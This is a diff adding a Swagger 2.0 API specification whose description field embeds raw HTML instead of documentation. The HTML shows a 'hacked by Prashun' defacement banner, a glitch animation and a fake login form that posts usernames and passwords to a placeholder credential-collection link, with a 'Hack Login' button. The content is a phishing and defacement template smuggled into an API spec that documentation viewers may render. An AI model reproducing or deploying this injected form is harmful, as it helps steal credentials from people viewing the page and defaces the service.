@@ -1,0 +1,59 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Hacked Login Page
+  description: '<div class="login-form">
+<!-- Error Message (Hacked) -->
+<div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
+  <div style="background-color: #f8d7da; color: #721c24; padding: 16px 20px; border-radius: 4px; border: 1px solid #f5c6cb; font-size: 16px; text-align: center;">
+    <strong>Warning: This page has been hacked by Prashun. Proceed with caution!</strong>
+  </div>
+</div>
+
+<!-- Hacked Login Form -->
+<div class="heading" style="position: relative;">
+  <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 2px;">Hacked Login Page</h1>
+  <div class="form-container" style="width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
+    <form action="#YOURLINKTOGETCREDENTIALS" method="post" class="form-signin">
+      <div class="form-group" style="margin-bottom: 15px;">
+        <label for="username" style="font-size: 14px; color: #555; display: block; margin-bottom: 5px;">Username</label>
+        <input type="text" name="username" size="20" style="width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; background-color: #f0f0f0; box-shadow: 0px 0px 5px rgba(255, 0, 0, 0.5);">
+      </div>
+      <div class="form-group" style="margin-bottom: 15px;">
+        <label for="password" style="font-size: 14px; color: #555; display: block; margin-bottom: 5px;">Password</label>
+        <input type="password" name="password" size="20" style="width: 100%; padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; background-color: #f0f0f0; box-shadow: 0px 0px 5px rgba(255, 0, 0, 0.5);">
+      </div>
+      <div class="form-group" style="margin-top: 20px;">
+        <button type="submit" class="btn btn-default" style="width: 100%; padding: 12px; background-color: #d9534f; border: none; color: white; font-size: 16px; border-radius: 4px; cursor: pointer; transition: background-color 0.3s; box-shadow: 0px 0px 10px rgba(255, 0, 0, 0.5);">Hack Login</button>
+      </div>
+    </form>
+  </div>
+</div>
+
+<!-- Footer with Hacker Signature -->
+<div style="position: fixed; bottom: 10px; right: 10px; font-size: 12px; color: #ff0000;">
+  <strong>Hacked by Prashun | Access Denied</strong>
+</div>
+
+<!-- Glitch Animation Effect -->
+<div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 36px; color: #ff0000; font-family: 'Courier New', monospace; animation: glitch 1s infinite;">
+  <span style="position: relative; z-index: 1;">ERROR 404</span>
+  <span style="position: absolute; left: -2px; text-shadow: -2px 0 red;">ERROR 404</span>
+  <span style="position: absolute; left: 2px; text-shadow: 2px 0 blue;">ERROR 404</span>
+</div>
+
+<style>
+  @keyframes glitch {
+    0% { transform: translate(-50%, -50%) skew(0deg); }
+    50% { transform: translate(-50%, -50%) skew(3deg); }
+    100% { transform: translate(-50%, -50%) skew(0deg); }
+  }
+</style>
+
+  '
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login attempt made (Hacked page)
